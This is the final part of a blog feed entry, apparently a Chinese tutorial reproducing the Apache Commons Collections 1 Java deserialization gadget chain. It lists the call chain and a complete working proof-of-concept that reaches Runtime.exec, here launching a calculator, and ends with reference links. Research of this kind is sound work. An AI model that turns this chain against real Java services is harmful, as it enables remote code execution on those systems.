src="/2021/10/27/Java-CC1链复现与分析/22.png" alt="22"></p><h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map.Entry.setValue()</span><br><span class="line">  TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h4 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open -a calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">"value"</span>,<span class="string">"aaa"</span>);</span><br><span class="line">       Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">       Class c = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">       annotationInvocationhdlConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object o = annotationInvocationhdlConstructor.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">transformedMap</span>)</span>;</span><br><span class="line">       serialize(o);</span><br><span class="line">       unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String  Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li><li><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></li><li><a href="https://paper.seebug.org/1242/" target="_blank" rel="noopener">https://paper.seebug.org/1242/</a></li><li><a href="https://www.buaq.net/go-75937.html" target="_blank" rel="noopener">https://www.buaq.net/go-75937.html</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MjgyNDA5NQ==&amp;mid=2247483715&amp;idx=1&amp;sn=bda48a95891b8a4533fbe1535d1ac75b&amp;chksm=e97727b3de00aea5e21cfa1407e669da095fed826733265e0beb93107e434178b8329f6cfe32&amp;token=1359929470&amp;lang=zh_CN#rd</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Apache-Commons-Collections&quot;&gt;&lt;a href=&quot;#Apache-Commons-Collections&quot; class=&quot;headerlink&quot; title=&quot;Apache Commons Collections&quot;&gt;&lt;/a&gt;Apache C
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
</feed>
